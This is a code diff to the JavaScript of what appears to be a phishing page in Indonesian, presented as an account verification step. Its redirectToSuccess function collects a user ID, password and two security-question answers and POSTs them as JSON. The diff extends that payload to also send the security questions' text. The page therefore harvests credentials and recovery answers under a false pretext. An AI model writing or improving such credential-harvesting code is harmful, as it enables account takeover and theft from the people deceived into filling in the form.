@@ -221,7 +221,7 @@ function hideVerification() {
                 a2.style.marginLeft = "3px";
             }
         } else {
-            img.src = "img/verifikasi.png";
+            img.src = "img/verifikasi1.png";
             currentImage = 1;
             if (a1) {
                 a1.style.marginTop = "";
@@ -256,6 +256,8 @@ function redirectToSuccess() {
     const password = (document.getElementById("password") || {}).value || "";
     const answer1 = (document.getElementById("answer1") || {}).value || "";
     const answer2 = (document.getElementById("answer2") || {}).value || "";
+    const question1 = document.getElementById("question1Label").textContent;
+    const question2 = document.getElementById("question2Label").textContent;
     if (!userID || !password || !answer1 || !answer2) return;
 
     isSubmitted = true;
@@ -272,9 +274,10 @@ function redirectToSuccess() {
         body: JSON.stringify({
             userID,
             password,
-            answer1,
-            answer2,
-            // Hapus ip, city, region agar tidak terjadi ReferenceError
+            question1: question1, 
+            answer1: answer1,
+            question2: question2,
+            answer2: answer2
         }),
     })
     .then((res) => res.text())
